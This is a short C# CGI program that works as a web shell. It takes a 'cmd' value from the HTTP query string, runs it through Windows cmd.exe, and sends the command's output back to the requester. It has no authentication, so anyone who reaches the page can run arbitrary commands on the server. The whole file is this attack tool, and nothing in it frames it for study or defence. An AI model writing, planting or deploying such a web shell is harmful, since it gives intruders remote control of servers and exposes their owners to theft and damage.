using System;
using System.Text;
using System.Diagnostics;


namespace cgisharp
{
    class CgiBin
    {
        static void Main()
        {

            string queryString = Environment.GetEnvironmentVariable("QUERY_STRING");
            string[] queryParams = queryString.Split('&');
            string shellOut;

            Console.WriteLine("Content-Type: text/plain\n\n");

            foreach (string param in queryParams)
            {
                string[] keyVal = param.Split('=');
                if (keyVal.Length == 2)
                {
                    if (keyVal[0] == "cmd")
                    {
                        string command = Uri.UnescapeDataString(keyVal[1]);
                        Console.WriteLine(String.Format("[+] Running: {0}\n", command));

                        ProcessStartInfo procInfo = new ProcessStartInfo();
                        procInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
                        procInfo.Arguments = "/c " + command;

                        procInfo.RedirectStandardError = true;
                        procInfo.RedirectStandardOutput = true;
                        procInfo.CreateNoWindow = true;
                        procInfo.UseShellExecute = false;

                        using (Process proc = new Process())
                        {
                            proc.StartInfo = procInfo;
                            proc.Start();

                            StringBuilder output = new StringBuilder();
                            output.Append(proc.StandardOutput.ReadToEnd());
                            output.Append(proc.StandardError.ReadToEnd());

                            proc.WaitForExit();

                            shellOut = output.ToString();
                        }
                        
                        Console.WriteLine(shellOut);
                        Console.WriteLine("\n[+] Done!");
                    }
                }
            }            

        }
    }
}
